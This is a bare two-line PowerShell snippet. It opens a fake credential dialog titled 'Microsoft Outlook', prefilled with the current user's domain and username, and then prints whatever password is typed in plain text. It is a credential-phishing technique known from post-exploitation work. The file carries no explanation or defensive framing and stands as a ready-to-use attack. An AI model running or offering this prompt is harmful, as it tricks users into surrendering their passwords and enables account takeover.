$c = $Host.ui.PromptForCredential("Microsoft Outlook","Please enter your credentials","$env:userdomain\$env:username","")
$c.GetNetworkCredential() | fl *